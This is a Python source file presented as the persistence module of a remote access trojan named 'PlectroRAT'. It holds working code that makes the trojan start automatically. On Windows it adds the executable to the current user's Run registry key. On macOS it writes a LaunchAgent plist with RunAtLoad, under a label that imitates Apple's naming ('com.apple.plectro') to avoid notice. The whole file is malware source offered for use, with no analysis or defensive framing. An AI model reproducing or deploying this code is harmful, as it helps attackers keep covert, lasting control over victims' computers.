

# Persistence module for PlectroRAT
# Adds the RAT to startup on Windows and macOS

import os
import sys
import shutil
import platform

def add_to_startup():
    system = platform.system()
    if system == "Windows":
        add_to_startup_windows()
    elif system == "Darwin":
        add_to_startup_macos()

def add_to_startup_windows():
    try:
        import winreg
        exe_path = sys.executable
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "PlectroRAT", 0, winreg.REG_SZ, exe_path)
    except Exception as e:
        print(f"[!] Windows persistence failed: {e}")

def add_to_startup_macos():
    launch_agent_dir = os.path.expanduser("~/Library/LaunchAgents")
    plist_name = "com.apple.plectro.plist"
    plist_path = os.path.join(launch_agent_dir, plist_name)
    exe_path = sys.executable

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.plectro</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""

    try:
        os.makedirs(launch_agent_dir, exist_ok=True)
        with open(plist_path, "w") as f:
            f.write(plist_content)
    except Exception as e:
        print(f"[!] macOS persistence failed: {e}")